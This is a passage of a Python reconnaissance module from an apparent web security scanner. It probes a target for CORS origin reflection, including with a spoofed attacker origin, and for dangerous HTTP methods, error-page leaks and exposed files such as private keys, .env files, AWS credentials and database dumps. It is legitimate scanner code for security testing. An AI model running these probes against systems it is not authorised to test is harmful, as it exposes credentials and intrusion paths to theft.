"""Extended recon checks — CORS, exposed files, HTTP methods, error pages,
GraphQL introspection, API discovery, host header injection, admin panels,
rate limits, differential response analysis, and WAF gap analysis."""

import http.client
import json
import re
import socket
import ssl
import time
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from fray import __version__
from fray.recon.http import _http_get, _make_ssl_context


def check_robots_sitemap(host: str, port: int, use_ssl: bool,
                         timeout: int = 8, fast: bool = False) -> Dict[str, Any]:
    """Parse robots.txt and sitemap.xml for hidden paths and URL extraction.

    Phase 1: Parse robots.txt — extract Disallow paths, Sitemap references.
    Phase 2: Fetch and parse sitemap.xml — extract URLs, detect sub-sitemaps.
             Skipped in fast mode.
    """
    result: Dict[str, Any] = {
        "robots_txt": False,
        "disallowed_paths": [],
        "sitemaps": [],
        "interesting_paths": [],
        "sitemap_urls": [],
        "sitemap_url_count": 0,
    }

    # robots.txt
    status, _, body = _http_get(host, port, "/robots.txt", use_ssl, timeout=timeout)
    if status == 200 and body and "disallow" in body.lower():
        result["robots_txt"] = True
        interesting_keywords = ("admin", "api", "backup", "config", "dashboard",
                                "debug", "internal", "login", "manage", "panel",
                                "private", "secret", "staging", "test", "upload",
                                "wp-admin", "cgi-bin", ".env", "xmlrpc")
        for line in body.splitlines():
            line = line.strip()
            if line.lower().startswith("disallow:"):
                path = line.split(":", 1)[1].strip()
                if path and path != "/":
                    result["disallowed_paths"].append(path)
                    if any(kw in path.lower() for kw in interesting_keywords):
                        result["interesting_paths"].append(path)
            elif line.lower().startswith("sitemap:"):
                sm = line.split(":", 1)[1].strip()
                if sm:
                    result["sitemaps"].append(sm)

    # sitemap.xml (if no sitemaps found in robots.txt, try default location)
    if not result["sitemaps"]:
        status, _, body = _http_get(host, port, "/sitemap.xml", use_ssl, timeout=timeout)
        if status == 200 and body and "<urlset" in body.lower():
            result["sitemaps"].append(f"{'https' if use_ssl else 'http'}://{host}/sitemap.xml")

    # ── Phase 2: Parse sitemap.xml URLs (#180) ──
    # Skip in fast mode — sitemap URL extraction is slow for large sitemaps
    if fast:
        result["sitemap_url_count"] = 0
        # Flag interesting paths from robots disallowed paths only
        return result

    # Extract <loc> URLs from sitemaps (follow one level of sitemap index)
    _SM_PATHS = set()
    for sm_url in result["sitemaps"][:5]:  # Cap at 5 sitemaps
        # Determine path from URL
        try:
            parsed = urllib.parse.urlparse(sm_url)
            sm_path = parsed.path or "/sitemap.xml"
            sm_host = parsed.hostname or host
            sm_port = parsed.port or port
            sm_ssl = parsed.scheme == "https" if parsed.scheme else use_ssl
        except Exception:
            sm_path, sm_host, sm_port, sm_ssl = "/sitemap.xml", host, port, use_ssl

        s, _, sm_body = _http_get(sm_host, sm_port, sm_path, sm_ssl, timeout=timeout)
        if s != 200 or not sm_body:
            continue

        # Extract <loc>...</loc> tags
        locs = re.findall(r'<loc>\s*(.*?)\s*</loc>', sm_body, re.IGNORECASE)
        for loc in locs:
            loc = loc.strip()
            if not loc:
                continue
            # Sub-sitemap (sitemap index) — follow one level deep
            if loc.endswith(".xml") or "sitemap" in loc.lower():
                if loc not in _SM_PATHS and len(_SM_PATHS) < 10:
                    _SM_PATHS.add(loc)
                    try:
                        p2 = urllib.parse.urlparse(loc)
                        s2, _, b2 = _http_get(
                            p2.hostname or host, p2.port or port,
                            p2.path or "/", p2.scheme == "https" if p2.scheme else use_ssl,
                            timeout=timeout)
                        if s2 == 200 and b2:
                            sub_locs = re.findall(r'<loc>\s*(.*?)\s*</loc>', b2, re.IGNORECASE)
                            for sl in sub_locs[:200]:
                                sl = sl.strip()
                                if sl and not sl.endswith(".xml"):
                                    result["sitemap_urls"].append(sl)
                    except Exception:
                        pass
            else:
                result["sitemap_urls"].append(loc)

        # Cap total extracted URLs
        if len(result["sitemap_urls"]) > 500:
            result["sitemap_urls"] = result["sitemap_urls"][:500]
            break

    result["sitemap_url_count"] = len(result["sitemap_urls"])

    # Flag interesting sitemap URLs
    _sm_interesting = ("admin", "api", "login", "dashboard", "internal",
                       "staging", "debug", "graphql", "wp-json", "upload")
    for url in result["sitemap_urls"]:
        path = urllib.parse.urlparse(url).path.lower()
        if any(kw in path for kw in _sm_interesting):
            if url not in result["interesting_paths"]:
                result["interesting_paths"].append(url)

    return result


def check_vdp(host: str, port: int, use_ssl: bool,
              timeout: int = 8) -> Dict[str, Any]:
    """#121 — Parse security.txt (RFC 9116) for Vulnerability Disclosure Policy.

    Fetches /.well-known/security.txt (primary) and /security.txt (fallback).
    Extracts all standard fields: Contact, Expires, Encryption, Acknowledgments,
    Preferred-Languages, Canonical, Policy, Hiring.

    Returns:
        Dict with 'found', 'url', 'contacts', 'policy', 'expires', 'hiring',
        'encryption', 'preferred_languages', 'acknowledgments', 'canonical',
        'signed' (PGP), 'issues' (missing required fields, expired, etc.).
    """
    result: Dict[str, Any] = {
        "found": False,
        "url": "",
        "contacts": [],
        "policy": "",
        "expires": "",
        "hiring": "",
        "encryption": "",
        "preferred_languages": [],
        "acknowledgments": "",
        "canonical": "",
        "signed": False,
        "raw_length": 0,
        "issues": [],
    }

    body = ""
    scheme = "https" if use_ssl else "http"
    for path in ("/.well-known/security.txt", "/security.txt"):
        status, _, resp_body = _http_get(host, port, path, use_ssl, timeout=timeout)
        if status == 200 and resp_body and "contact:" in resp_body.lower():
            body = resp_body
            result["found"] = True
            result["url"] = f"{scheme}://{host}{path}"
            result["raw_length"] = len(body)
            break

    if not body:
        return result

    # PGP signed?
    if "-----BEGIN PGP SIGNED MESSAGE-----" in body:
        result["signed"] = True

    # Parse RFC 9116 fields (case-insensitive)
    for line in body.splitlines():
        line = line.strip()
        if line.startswith("#") or not line:
            continue

        lower = line.lower()
        if lower.startswith("contact:"):
            val = line.split(":", 1)[1].strip()
            if val:
                result["contacts"].append(val)
        elif lower.startswith("expires:"):
            result["expires"] = line.split(":", 1)[1].strip()
        elif lower.startswith("encryption:"):
            result["encryption"] = line.split(":", 1)[1].strip()
        elif lower.startswith("acknowledgments:") or lower.startswith("acknowledgements:"):
            result["acknowledgments"] = line.split(":", 1)[1].strip()
        elif lower.startswith("preferred-languages:"):
            langs = line.split(":", 1)[1].strip()
            result["preferred_languages"] = [l.strip() for l in langs.split(",") if l.strip()]
        elif lower.startswith("canonical:"):
            result["canonical"] = line.split(":", 1)[1].strip()
        elif lower.startswith("policy:"):
            result["policy"] = line.split(":", 1)[1].strip()
        elif lower.startswith("hiring:"):
            result["hiring"] = line.split(":", 1)[1].strip()

    # Validate required fields (RFC 9116)
    if not result["contacts"]:
        result["issues"].append({
            "issue": "Missing required Contact field",
            "severity": "medium",
        })
    if not result["expires"]:
        result["issues"].append({
            "issue": "Missing required Expires field",
            "severity": "low",
        })
    elif result["expires"]:
        # Check if expired
        try:
            from datetime import datetime, timezone
            exp_str = result["expires"]
            # Handle ISO 8601 format
            exp = datetime.fromisoformat(exp_str.replace("Z", "+00:00"))
            if exp < datetime.now(timezone.utc):
                result["issues"].append({
                    "issue": f"security.txt expired on {exp_str}",
                    "severity": "medium",
                })
        except (ValueError, TypeError):
            pass

    # ── Enrichment: add actionable context ──────────────────────────────
    # Contact type classification (email vs URL vs phone)
    contact_classified = []
    for c in result["contacts"]:
        if c.startswith("mailto:"):
            contact_classified.append({"value": c, "type": "email",
                                        "display": c.replace("mailto:", "")})
        elif c.startswith("tel:"):
            contact_classified.append({"value": c, "type": "phone",
                                        "display": c.replace("tel:", "")})
        elif c.startswith("http"):
            contact_classified.append({"value": c, "type": "url", "display": c})
        else:
            contact_classified.append({"value": c, "type": "unknown", "display": c})
    result["contacts_classified"] = contact_classified

    # Bug bounty platform detection from policy/contact URLs
    _BB_PLATFORMS = {
        "hackerone.com":     "HackerOne",
        "bugcrowd.com":      "Bugcrowd",
        "intigriti.com":     "Intigriti",
        "yeswehack.com":     "YesWeHack",
        "synack.com":        "Synack",
        "cobalt.io":         "Cobalt",
        "openbugbounty.org": "Open Bug Bounty",
        "vulnerability-lab.com": "Vulnerability-Lab",
        "immunefi.com":      "Immunefi (web3)",
        "bountysource.com":  "BountySource",
    }
    all_urls = " ".join([c for c in result["contacts"]] +
                        [result.get("policy", ""), result.get("acknowledgments", "")])
    bb_platform = None
    for domain, name in _BB_PLATFORMS.items():
        if domain in all_urls.lower():
            bb_platform = name
            break
    result["bug_bounty_platform"] = bb_platform

    # Scope hint from policy URL
    result["has_policy"] = bool(result.get("policy"))
    result["has_encryption"] = bool(result.get("encryption"))
    result["has_pgp_signature"] = result.get("signed", False)

    # Summary for report display
    if result["found"]:
        summary_parts = []
        if contact_classified:
            emails = [c["display"] for c in contact_classified if c["type"] == "email"]
            urls   = [c["display"] for c in contact_classified if c["type"] == "url"]
            if emails:
                summary_parts.append(f"Contact: {emails[0]}")
            elif urls:
                summary_parts.append(f"Report URL: {urls[0]}")
        if bb_platform:
            summary_parts.append(f"Bug bounty: {bb_platform}")
        if result.get("policy"):
            summary_parts.append(f"Policy: {result['policy'][:60]}")
        if result["issues"]:
            summary_parts.append(
                f"{len(result['issues'])} issue(s): "
                + ", ".join(i["issue"] for i in result["issues"][:2])
            )
        result["summary"] = " | ".join(summary_parts) if summary_parts else "security.txt found"
    else:
        result["summary"] = "No security.txt — no vulnerability disclosure policy"

    return result


def check_cors(host: str, port: int, use_ssl: bool,
               timeout: int = 8) -> Dict[str, Any]:
    """Check for CORS misconfiguration."""
    result: Dict[str, Any] = {
        "cors_enabled": False,
        "allow_origin": None,
        "allow_credentials": False,
        "misconfigured": False,
        "issues": [],
    }

    scheme = "https" if use_ssl else "http"
    evil_origin = "https://evil.attacker.com"

    try:
        if use_ssl:
            try:
                ctx = _make_ssl_context(verify=True)
                conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
            except Exception:
                ctx = _make_ssl_context(verify=False)
                conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        conn.request("GET", "/", headers={
            "Host": host,
            "Origin": evil_origin,
            "User-Agent": f"Fray/{__version__} Recon",
        })
        resp = conn.getresponse()
        resp.read()
        headers = {k.lower(): v for k, v in resp.getheaders()}
        conn.close()

        acao = headers.get("access-control-allow-origin", "")
        acac = headers.get("access-control-allow-credentials", "").lower()

        if acao:
            result["cors_enabled"] = True
            result["allow_origin"] = acao

            if acac == "true":
                result["allow_credentials"] = True

            # Check for dangerous configs
            if acao == "*":
                result["misconfigured"] = True
                result["issues"].append({
                    "issue": "Wildcard Access-Control-Allow-Origin",
                    "severity": "medium",
                    "risk": "Any website can read responses from this origin",
                })
            if acao == evil_origin:
                result["misconfigured"] = True
                result["issues"].append({
                    "issue": "Origin reflected without validation",
                    "severity": "high",
                    "risk": "Attacker-controlled origin is trusted — data theft possible",
                })
            if acao == evil_origin and acac == "true":
                result["issues"].append({
                    "issue": "Reflected origin + credentials allowed",
                    "severity": "critical",
                    "risk": "Full account takeover possible — attacker can read authenticated responses",
                })
            if acao == "null":
                result["misconfigured"] = True
                result["issues"].append({
                    "issue": "Access-Control-Allow-Origin: null",
                    "severity": "medium",
                    "risk": "Sandboxed iframes can exploit null origin",
                })
    except Exception:
        pass

    # ── Multi-origin CORS probes ──
    # Test additional dangerous origin patterns beyond the single evil origin
    _cors_extra_origins = [
        ("null", "null origin (sandboxed iframe bypass)", "high"),
        (f"https://{host}.evil.com", "suffix bypass (attacker domain appending target)", "high"),
        (f"https://evil.{host}", "subdomain injection", "medium"),
        (f"https://not-{host}", "prefix variation", "medium"),
        (f"http://{host}", "scheme downgrade (HTTP instead of HTTPS)", "high"),
        (f"https://sub.{host}", "arbitrary subdomain accepted", "medium"),
    ]
    try:
        for _test_origin, _desc, _sev in _cors_extra_origins:
            if use_ssl:
                try:
                    _ctx = _make_ssl_context(verify=True)
                    _cc = http.client.HTTPSConnection(host, port, context=_ctx, timeout=timeout)
                except Exception:
                    _ctx = _make_ssl_context(verify=False)
                    _cc = http.client.HTTPSConnection(host, port, context=_ctx, timeout=timeout)
            else:
                _cc = http.client.HTTPConnection(host, port, timeout=timeout)
            _cc.request("GET", "/", headers={
                "Host": host, "Origin": _test_origin,
                "User-Agent": f"Fray/{__version__} Recon",
            })
            _cr = _cc.getresponse()
            _cr.read()
            _ch = {k.lower(): v for k, v in _cr.getheaders()}
            _cc.close()
            _cacao = _ch.get("access-control-allow-origin", "")
            _cacac = _ch.get("access-control-allow-credentials", "").lower()
            if _cacao == _test_origin:
                result["misconfigured"] = True
                _iss_sev = "critical" if _cacac == "true" else _sev
                result["issues"].append({
                    "issue": f"Origin reflected: {_test_origin}",
                    "severity": _iss_sev,
                    "risk": f"{_desc} — credentials={'true' if _cacac == 'true' else 'false'}",
                })
    except Exception:
        pass

    return result


def check_exposed_files(host: str, port: int, use_ssl: bool,
                        timeout: int = 5, fast: bool = False,
                        tech_stack: Optional[List[str]] = None) -> Dict[str, Any]:
    """Probe for commonly exposed sensitive files.

    If tech_stack is provided (list of lowercase tech names from fingerprinting),
    additional framework-specific probes are added automatically.
    """
    result: Dict[str, Any] = {
        "exposed": [],
        "checked": 0,
    }

    # ── Tech-specific probes (only run if tech detected) ──
    _TECH_PROBES: Dict[str, List[tuple]] = {
        "wordpress": [
            ("/wp-content/debug.log", "WordPress debug log (may contain errors/paths)"),
            ("/wp-json/wp/v2/users", "WordPress user enumeration via REST API"),
            ("/.wp-cli/config.yml", "WP-CLI config (credentials)"),
            ("/wp-content/uploads/", "WordPress uploads directory listing"),
        ],
        "laravel": [
            ("/storage/logs/laravel.log", "Laravel log file (stack traces, secrets)"),
            ("/_debugbar/open", "Laravel Debugbar exposed"),
            ("/telescope/requests", "Laravel Telescope (request inspector)"),
            ("/.env.backup", "Laravel environment backup"),
        ],
        "django": [
            ("/__debug__/", "Django Debug Toolbar exposed"),
            ("/admin/", "Django admin panel"),
            ("/static/admin/css/base.css", "Django admin static files exposed"),
        ],
        "spring": [
            ("/actuator/heapdump", "Spring Boot heap dump (memory contents!)"),
            ("/actuator/mappings", "Spring Boot endpoint mappings"),
            ("/actuator/configprops", "Spring Boot config properties"),
            ("/h2-console", "H2 database console (RCE risk)"),
            ("/jolokia", "Jolokia JMX endpoint (RCE risk)"),
        ],
        "node": [
            ("/.npmrc", "npm config (may contain auth tokens)"),
            ("/yarn.lock", "Yarn lockfile (dependency versions)"),
            ("/.node-version", "Node version file"),
        ],
        "rails": [
            ("/rails/info/properties", "Rails info page (full config)"),
            ("/rails/info/routes", "Rails route listing"),
        ],
        "php": [
            ("/php-fpm-status", "PHP-FPM status page"),
            ("/opcache-status.php", "OPcache status page"),
        ],
        "next": [
            ("/_next/data/", "Next.js data directory"),
            ("/api/__coverage__", "Next.js coverage endpoint"),
            ("/.next/BUILD_ID", "Next.js build ID (deployment fingerprint)"),
        ],
        "nuxt": [
            ("/_nuxt/", "Nuxt.js build assets"),
            ("/__nuxt__/", "Nuxt.js devtools"),
        ],
        "flask": [
            ("/console", "Flask/Werkzeug debugger console (RCE risk!)"),
            ("/static/", "Flask static directory listing"),
        ],
        "asp.net": [
            ("/elmah.axd", ".NET error log (stack traces, queries)"),
            ("/trace.axd", ".NET trace log"),
            ("/web.config", ".NET config (connection strings, keys)"),
            ("/_blazor", "Blazor app internals"),
        ],
        "graphql": [
            ("/graphql", "GraphQL endpoint"),
            ("/graphiql", "GraphiQL IDE (interactive query explorer)"),
            ("/playground", "GraphQL Playground"),
            ("/altair", "Altair GraphQL client"),
        ],
        "docker": [
            ("/v2/_catalog", "Docker Registry catalog (image listing)"),
            ("/.dockerenv", "Docker environment marker"),
        ],
        "firebase": [
            ("/__/firebase/init.json", "Firebase config (API keys, project ID)"),
        ],
    }

    # ── Content validation patterns for tech-specific probes ──
    _CONTENT_VALIDATORS: Dict[str, List[str]] = {
        "/wp-content/debug.log": ["PHP Fatal", "PHP Warning", "Stack trace"],
        "/wp-json/wp/v2/users": ['"id"', '"slug"', '"name"'],
        "/storage/logs/laravel.log": ["[stacktrace]", "Exception", "laravel"],
        "/_debugbar/open": ["debugbar", "Debugbar"],
        "/telescope/requests": ["telescope", "Telescope"],
        "/__debug__/": ["djdt", "debug"],
        "/actuator/heapdump": [],  # binary — any 200 with content is real
        "/actuator/mappings": ['"dispatcherServlets"', '"handler"'],
        "/actuator/configprops": ['"propertySources"', '"beans"'],
        "/h2-console": ["H2 Console", "h2-console"],
        "/jolokia": ['"request"', '"value"', "jolokia"],
        "/rails/info/properties": ["Rails version", "Ruby version"],
        "/rails/info/routes": ["Prefix", "Verb", "URI Pattern"],
        "/.npmrc": ["registry", "_authToken"],
        "/console": ["Werkzeug", "Debugger", "console", ">>> "],
        "/.next/BUILD_ID": [],  # any content = real build ID
        "/v2/_catalog": ['"repositories"'],
        "/__/firebase/init.json": ['"projectId"', '"apiKey"'],
        "/graphiql": ["GraphiQL", "graphiql"],
        "/playground": ["GraphQL Playground", "playground"],
        "/web.config": ["<configuration", "connectionString"],
        "/elmah.axd": ["Error Log", "ELMAH"],
        "/trace.axd": ["Trace Information", "Request Details"],
        # SSL / TLS private keys
        "/server.key":      ["BEGIN", "PRIVATE KEY"],
        "/server.pem":      ["BEGIN", "PRIVATE KEY", "CERTIFICATE"],
        "/privatekey.pem":  ["BEGIN", "PRIVATE KEY"],
        "/privkey.pem":     ["BEGIN", "PRIVATE KEY"],
        "/privkey1.pem":    ["BEGIN", "PRIVATE KEY"],
        "/cert.key":        ["BEGIN", "PRIVATE KEY"],
        "/tls.key":         ["BEGIN", "PRIVATE KEY"],
        "/ssl/server.key":  ["BEGIN", "PRIVATE KEY"],
        "/ssl/private.key": ["BEGIN", "PRIVATE KEY"],
        "/id_rsa":          ["BEGIN", "PRIVATE KEY"],
        "/id_ecdsa":        ["BEGIN", "PRIVATE KEY"],
        "/id_ed25519":      ["BEGIN", "PRIVATE KEY"],
        "/.ssh/id_rsa":     ["BEGIN", "PRIVATE KEY"],
        "/.ssh/authorized_keys": ["ssh-rsa ", "ssh-ed25519 ", "ecdsa-sha2-"],
        # Cloud credentials
        "/.aws/credentials":      ["[default]", "aws_access_key_id"],
        "/.aws/config":           ["[default]", "region"],
        "/.pypirc":               ["[pypi]", "password"],
        "/.netrc":                ["machine ", "password"],
        "/config/database.yml":   ["password:", "secret"],
        "/config/secrets.yml":    ["password:", "secret"],
        "/config/master.key":     [],   # any short non-empty content = key
        "/.vault-token":          [],   # any content = vault token
        "/terraform.tfvars":      ["="],
        "/docker-compose.yml":    ["services:", "version:"],
        "/k8s/secrets.yaml":      ["kind: Secret", "apiVersion"],
        # Logs
        "/debug.log": ["Exception", "Error", "WARNING", "FATAL", "Traceback", "error", "stack"],
        "/error.log": ["Exception", "Error", "WARNING", "FATAL", "Traceback"],
        "/app.log":   ["Exception", "Error", "WARNING", "FATAL", "Traceback"],
        # Backup archives (any large binary content)
        "/backup.tar.gz": [],
        "/backup.zip":    [],
        "/www.zip":       [],
        "/site.tar.gz":   [],
    }

    # High-value probes — always checked
    _PROBES_CORE = [
        ("/.env", "Environment variables (credentials, API keys)"),
        ("/.git/HEAD", "Git repository (source code exposure)"),
        ("/.git/config", "Git config (repo URL, credentials)"),
        ("/wp-config.php.bak", "WordPress config backup (DB creds)"),
        ("/phpinfo.php", "PHP info page (full server details)"),
        ("/actuator", "Spring Boot actuator (Java)"),
        ("/actuator/env", "Spring Boot environment variables"),
        ("/.well-known/security.txt", "Security contact info"),
        ("/backup.sql", "Database backup"),
        ("/package.json", "Node.js dependency file"),
        ("/requirements.txt", "Python dependency file"),
        ("/server-status", "Apache server status page"),
    ]
    # Extended probes — skipped in fast mode
    _PROBES_EXTENDED = [
        ("/.svn/entries", "SVN repository metadata"),
        ("/web.config", ".NET configuration file"),
        ("/.htaccess", "Apache configuration (may leak paths)"),
        ("/.htpasswd", "Apache password file"),
        ("/server-info", "Apache server info page"),
        ("/info.php", "PHP info page"),
        ("/debug", "Debug endpoint"),
        ("/elmah.axd", ".NET error log"),
        ("/trace.axd", ".NET trace log"),
        ("/crossdomain.xml", "Flash cross-domain policy"),
        ("/sitemap.xml.gz", "Compressed sitemap"),
        ("/dump.sql", "Database dump"),
        ("/db.sql", "Database file"),
        ("/.DS_Store", "macOS directory metadata"),
        ("/composer.json", "PHP dependency file (versions exposed)"),
        ("/Gemfile", "Ruby dependency file"),
        # SSL / TLS private keys — critical if exposed
        ("/server.key", "SSL/TLS private key"),
        ("/server.pem", "SSL/TLS certificate + key bundle"),
        ("/privatekey.pem", "SSL/TLS private key"),
        ("/privkey.pem", "Let's Encrypt private key"),
        ("/privkey1.pem", "Let's Encrypt private key (certbot rotation)"),
        ("/cert.key", "SSL/TLS private key"),
        ("/tls.key", "TLS private key (Kubernetes-style)"),
        ("/ssl/server.key", "SSL private key in ssl/ directory"),
        ("/ssl/private.key", "SSL private key in ssl/ directory"),
        ("/id_rsa", "SSH RSA private key"),
        ("/id_ecdsa", "SSH ECDSA private key"),
        ("/id_ed25519", "SSH Ed25519 private key"),
        ("/.ssh/id_rsa", "SSH private key in .ssh directory"),
        ("/.ssh/authorized_keys", "SSH authorized keys list"),
        # Cloud / CI credentials
        ("/.aws/credentials", "AWS credentials file"),
        ("/.aws/config", "AWS config file"),
        ("/.npmrc", "NPM config (may contain auth token)"),
        ("/.pypirc", "PyPI credentials"),
        ("/.netrc", "Generic credentials file (FTP/HTTP passwords)"),
        ("/config/database.yml", "Rails database credentials"),
        ("/config/secrets.yml", "Rails secrets"),
        ("/config/master.key", "Rails master encryption key"),
        ("/.vault-token", "HashiCorp Vault token"),
        ("/terraform.tfvars", "Terraform variables (may contain secrets)"),
        # Docker / Kubernetes
        ("/docker-compose.yml", "Docker Compose (may contain secrets)"),
        ("/k8s/secrets.yaml", "Kubernetes secrets manifest"),
        # Application logs (sensitive data often leaks here)
        ("/debug.log", "Application debug log"),
        ("/error.log", "Application error log"),
        ("/app.log", "Application log"),
        # Backup archives
        ("/backup.tar.gz", "Site backup archive"),
        ("/backup.zip", "Site backup archive (zip)"),
        ("/www.zip", "Web root backup"),
        ("/site.tar.gz", "Site backup archive"),
    ]

    probes = _PROBES_CORE if fast else _PROBES_CORE + _PROBES_EXTENDED

    # Add tech-specific probes based on detected stack
    if tech_stack:
        _stack_lower = {t.lower() for t in tech_stack}
        for _tech_key, _tech_probes in _TECH_PROBES.items():
            if any(_tech_key in t for t in _stack_lower):
                for _tp in _tech_probes:
                    if _tp not in probes:
                        probes.append(_tp)

    import concurrent.futures

    def _probe_file(probe_path, description):
        try:
            status, headers, body = _http_get(
                host, port, probe_path, use_ssl, timeout=timeout, max_redirects=0
            )
            if status == 200 and len(body) > 0:
                is_real = False
                if probe_path == "/.git/HEAD" and body.strip().startswith("ref:"):
                    is_real = True
                elif probe_path == "/.git/config" and "[core]" in body:
                    is_real = True
                elif probe_path == "/.env" and "=" in body and len(body) < 50000:
                    is_real = True
                elif probe_path.endswith(".sql") and ("CREATE TABLE" in body or "INSERT INTO" in body):
                    is_real = True
                elif probe_path == "/phpinfo.php" and "phpinfo()" in body:
                    is_real = True
                elif probe_path == "/info.php" and "phpinfo()" in body:
                    is_real = True
                elif probe_path == "/actuator" and len(body) < 10000 and ('"_links"' in body or '"status"' in body):
                    is_real = True
                elif probe_path == "/actuator/env" and len(body) < 50000 and "propertySources" in body:
                    is_real = True
                elif probe_path == "/server-status" and "Apache Server Status" in body:
                    is_real = True
                elif probe_path == "/server-info" and "Apache Server Information" in body:
                    is_real = True
                elif probe_path == "/debug" and len(body) < 5000 and ("debug" in body.lower()[:200]):
                    is_real = True
                elif probe_path == "/.well-known/security.txt" and ("contact:" in body.lower() or "policy:" in body.lower()):
                    is_real = True
                elif probe_path == "/composer.json" and '"require"' in body:
                    is_real = True
                elif probe_path == "/package.json" and '"dependencies"' in body:
                    is_real = True
                elif probe_path == "/requirements.txt" and "==" in body:
                    is_real = True
                elif probe_path == "/Gemfile" and "gem " in body:
                    is_real = True
                elif probe_path in _CONTENT_VALIDATORS:
                    _patterns = _CONTENT_VALIDATORS[probe_path]
                    if not _patterns:
                        is_real = True  # no patterns = any 200 with body is real
                    elif any(p in body for p in _patterns):
                        is_real = True
                elif len(body) < 5000 and status == 200:
                    is_real = True

                if is_real:
                    severity = "critical"
                    if probe_path in ("/.well-known/security.txt", "/crossdomain.xml",
                                      "/sitemap.xml.gz", "/.next/BUILD_ID",
                                      "/.node-version"):
                        severity = "info"
                    elif probe_path in ("/composer.json", "/package.json",
                                        "/requirements.txt", "/Gemfile",
                                        "/yarn.lock", "/_next/data/",
                                        "/_nuxt/", "/static/",
                                        "/docker-compose.yml"):
                        severity = "medium"
                    elif probe_path in ("/debug.log", "/error.log", "/app.log"):
                        severity = "high"
                    elif probe_path in ("/console", "/actuator/heapdump",
                                        "/h2-console", "/jolokia",
                                        "/v2/_catalog"):
                        severity = "critical"  # RCE risk
                    return {
                        "path": probe_path,
                        "description": description,
                        "status": status,
                        "size": len(body),
                        "severity": severity,
                    }
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(_probe_file, p, d): p for p, d in probes}
        for future in concurrent.futures.as_completed(futures):
            result["checked"] += 1
            try:
                entry = future.result()
                if entry:
                    result["exposed"].append(entry)
            except Exception:
                pass

    return result


def check_http_methods(host: str, port: int, use_ssl: bool,
                       timeout: int = 5, fast: bool = False) -> Dict[str, Any]:
    """Check allowed HTTP methods via OPTIONS + individual probes.

    Phase 1: Send OPTIONS request to get Allow header.
    Phase 2: Probe dangerous methods individually (PUT, DELETE, TRACE, PATCH,
             CONNECT) since many servers omit them from OPTIONS but still accept them.
             Skipped in fast mode.
    """
    result: Dict[str, Any] = {
        "allowed_methods": [],
        "dangerous_methods": [],
        "options_status": 0,
        "probed_methods": {},
        "issues": [],
    }

    def _make_conn():
        if use_ssl:
            try:
                ctx = _make_ssl_context(verify=True)
                return http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
            except Exception:
                ctx = _make_ssl_context(verify=False)
                return http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
        return http.client.HTTPConnection(host, port, timeout=timeout)

    # Phase 1: OPTIONS
    try:
        conn = _make_conn()
        conn.request("OPTIONS", "/", headers={
            "Host": host,
            "User-Agent": f"Fray/{__version__} Recon",
        })
        resp = conn.getresponse()
        resp.read()
        result["options_status"] = resp.status
        headers = {k.lower(): v for k, v in resp.getheaders()}
        conn.close()

        allow = headers.get("allow", headers.get("access-control-allow-methods", ""))
        if allow:
            methods = [m.strip().upper() for m in allow.split(",")]
            result["allowed_methods"] = methods
    except Exception:
        pass

    # Phase 2: Probe dangerous methods individually
    # Skipped in fast mode — OPTIONS result is sufficient
    if fast:
        _DANGEROUS = {"PUT", "DELETE", "TRACE", "PATCH", "CONNECT"}
        found_dangerous = [m for m in result["allowed_methods"] if m in _DANGEROUS]
        result["dangerous_methods"] = found_dangerous
        return result

    _DANGEROUS = {"PUT", "DELETE", "TRACE", "PATCH", "CONNECT"}
    # Only probe methods not already confirmed by OPTIONS
    confirmed = set(result["allowed_methods"])
    to_probe = _DANGEROUS - confirmed

    for method in sorted(to_probe):
        try:
            conn = _make_conn()
            conn.request(method, "/_fray_method_probe", headers={
                "Host": host,
                "User-Agent": f"Fray/{__version__} Recon",
                "Content-Length": "0",
            })
            resp = conn.getresponse()
            resp.read()
            status = resp.status
            conn.close()
            result["probed_methods"][method] = status
            # 405 = Method Not Allowed → server rejects it (good)
            # 501 = Not Implemented → server doesn't support it (good)
            # Anything else (200, 201, 204, 301, 302, 400, 403) = method is accepted
            if status not in (405, 501):
                if method not in result["allowed_methods"]:
                    result["allowed_methods"].append(method)
        except Exception:
            result["probed_methods"][method] = 0

    # Classify dangerous
    found_dangerous = [m for m in result["allowed_methods"] if m in _DANGEROUS]
    result["dangerous_methods"] = found_dangerous

    if "TRACE" in found_dangerous:
        result["issues"].append({
            "method": "TRACE",
            "severity": "high",
            "risk": "Cross-Site Tracing (XST) — can steal credentials via XSS",
        })
    if "PUT" in found_dangerous:
        result["issues"].append({
            "method": "PUT",
            "severity": "medium",
            "risk": "File upload via PUT — may allow arbitrary file writes",
        })
    if "DELETE" in found_dangerous:
        result["issues"].append({
            "method": "DELETE",
            "severity": "medium",
            "risk": "Resource deletion — may allow unauthorized deletions",
        })
    if "PATCH" in found_dangerous:
        result["issues"].append({
            "method": "PATCH",
            "severity": "low",
            "risk": "PATCH method accepted — verify authorization controls",
        })

    return result


def check_error_page(host: str, port: int, use_ssl: bool,
                     timeout: int = 5) -> Dict[str, Any]:
    """Fetch a 404 page to fingerprint framework/version from error output."""
    result: Dict[str, Any] = {
        "status": 0,
        "server_header": None,
        "framework_hints": [],
        "version_leaks": [],
        "stack_trace": False,
    }

    random_path = f"/fray-recon-{int(datetime.now().timestamp())}-404"
    status, headers, body = _http_get(host, port, random_path, use_ssl, timeout=timeout)
    result["status"] = status
    result["server_header"] = headers.get("server")

    if not body:
        return result

    # Stack trace detection
    stack_patterns = [
        r"Traceback \(most recent call last\)",  # Python
        r"at\s+[\w.$]+\([\w.]+\.java:\d+\)",     # Java
        r"#\d+\s+[\w\\/:]+\.php\(\d+\)",          # PHP
        r"at\s+[\w.]+\s+in\s+[\w\\/:.]+:\d+",     # .NET
        r"Error:.*\n\s+at\s+",                     # Node.js
    ]
    for pat in stack_patterns:
        if re.search(pat, body):
            result["stack_trace"] = True
            break

    # Version leaks
    version_patterns = [
        (r"Apache/([\d.]+)", "Apache"),
        (r"nginx/([\d.]+)", "nginx"),
        (r"Microsoft-IIS/([\d.]+)", "IIS"),
        (r"PHP/([\d.]+)", "PHP"),
        (r"X-Powered-By:\s*Express", "Express.js"),
        (r"Django.*?([\d.]+)", "Django"),
